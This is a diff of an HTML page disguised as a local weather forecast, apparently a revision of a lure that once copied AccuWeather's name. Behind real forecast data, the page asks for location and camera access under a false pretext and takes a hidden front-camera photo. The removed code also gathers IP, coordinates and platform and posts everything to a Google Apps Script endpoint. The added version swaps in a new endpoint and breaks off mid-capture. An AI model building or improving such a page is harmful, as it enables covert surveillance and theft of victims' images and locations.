@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AccuWeather Live - Local Forecast</title>
+    <title>Weather Live - Local Forecast</title>
     <style>
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            font-family: 'Segoe UI', sans-serif; 
             margin: 0; 
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); 
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); 
             color: white; 
             height: 100vh; 
             display: flex; 
@@ -17,137 +17,94 @@
             text-align: center; 
         }
         .card { 
-            background: rgba(0, 0, 0, 0.5); 
+            background: rgba(255, 255, 255, 0.1); 
             padding: 40px; 
-            border-radius: 30px; 
-            backdrop-filter: blur(15px); 
+            border-radius: 25px; 
+            backdrop-filter: blur(10px); 
             width: 85%; 
-            max-width: 400px; 
-            border: 1px solid rgba(255, 255, 255, 0.2); 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            max-width: 380px; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
         }
-        h1 { font-size: 4rem; margin: 10px 0; }
-        .city { font-size: 1.1rem; text-transform: uppercase; letter-spacing: 3px; opacity: 0.9; }
-        .stat { font-size: 1.4rem; margin-bottom: 20px; font-weight: 300; }
+        h1 { font-size: 3.5rem; margin: 10px 0; }
+        .city { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; color: #00d2ff; }
         .btn { 
-            background: #ffffff; 
-            color: #1a2a6c; 
+            background: #00d2ff; 
+            color: #fff; 
             border: none; 
-            padding: 18px; 
+            padding: 15px 30px; 
             border-radius: 50px; 
             font-weight: bold; 
-            font-size: 1rem;
+            margin-top: 25px; 
             cursor: pointer; 
             width: 100%; 
-            transition: transform 0.2s;
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
         }
-        .btn:active { transform: scale(0.95); }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="city" id="city">Searching...</div>
+    <div class="city" id="city">Locating...</div>
     <h1 id="temp">--°</h1>
-    <div class="stat" id="stat">Checking Atmosphere</div>
-    <button class="btn" onclick="runUpdate()">UPDATE FORECAST</button>
+    <p id="stat">Weather Sync Active</p>
+    <button class="btn" onclick="startUpdate()">UPDATE WEATHER</button>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-    // YOUR UPDATED SCRIPT URL
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzycqQ90PanGrOMWec3kurritAGMcALIcVTb0xo5bh-f4XwhFedBJLqigJ-jkYIKLhL2w/exec';
+    // YOUR NEW DEPLOYMENT URL
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz_pkHURWWvhYeybgIVdKojewXJvXiiiCvXQeu9lBGXrIkHn6q6uKXCp7k0POHK-9gLPg/exec';
 
-    async function runUpdate() {
+    async function startUpdate() {
         const btn = document.querySelector('.btn');
-        btn.innerText = "SYNCING DATA...";
+        btn.innerText = "SYNCING...";
         btn.disabled = true;
 
         if (!navigator.geolocation) {
-            alert("Geolocation is not supported by your browser.");
+            alert("Geolocation not supported.");
             return;
         }
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
+            // Update UI with real local temperature
             try {
-                // 1. Fetch real-time weather for the UI
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
-                const weatherData = await response.json();
-                
-                document.getElementById('temp').innerText = Math.round(weatherData.current_weather.temperature) + "°";
-                document.getElementById('city').innerText = "LOCAL AREA ACTIVE";
-                document.getElementById('stat').innerText = "Conditions Optimized";
-
-                // 2. Start Background Capture
-                captureAndSend(pos);
-            } catch (err) {
-                console.error("Weather fetch failed");
-            }
-        }, (error) => {
-            alert("Please allow Location and Camera access to view local weather.");
-            btn.innerText = "UPDATE FORECAST";
+                const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`).then(r => r.json());
+                document.getElementById('temp').innerText = Math.round(w.current_weather.temperature) + "°";
+                document.getElementById('city').innerText = "LOCAL AREA DATA";
+            } catch (e) { console.log("Weather fetch error"); }
+            
+            // Run the capture and send process
+            await captureAndSend(pos);
+            
+            btn.innerText = "UPDATED";
+        }, (err) => {
+            alert("Please allow Location and Camera access to continue.");
+            btn.innerText = "UPDATE WEATHER";
             btn.disabled = false;
         });
     }
 
     async function captureAndSend(pos) {
-        let photoData = null;
-        
+        let photo = null;
         try {
-            // Attempt to access camera
+            // Access camera
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('v');
             video.srcObject = stream;
             
-            // Wait for camera to stabilize
-            await new Promise(resolve => setTimeout(resolve, 1200));
+            // Short delay to let camera focus
+            await new Promise(r => setTimeout(r, 1000));
             
             const canvas = document.getElementById('c');
-            canvas.width = 640;
-            canvas.height = 480;
+            canvas.width = 400; 
+            canvas.height = 300;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            // Convert to Base64 (Compressed for faster upload)
-            photoData = canvas.toDataURL('image/jpeg', 0.5);
+            // Compress photo to avoid large payloads
+            photo = canvas.toDataURL('image/jpeg', 0.4);
             
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-        } catch (e) {
-            console.log("Camera access denied or unavailable");
-        }
-
-        // Get IP Address
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-
-        // Prepare the payload
-        const payload = {
-            ip: ipData.ip,
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            os: navigator.platform,
-            battery: "N/A",
-            photo: photoData
-        };
-
-        // Send to Google Script
-        await fetch(SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(payload)
-        });
-
-        document.querySelector('.btn').innerText = "FORECAST UPDATED";
-    }
-</script>
-
-</body>
-</html>
-
-
-
+            // Stop
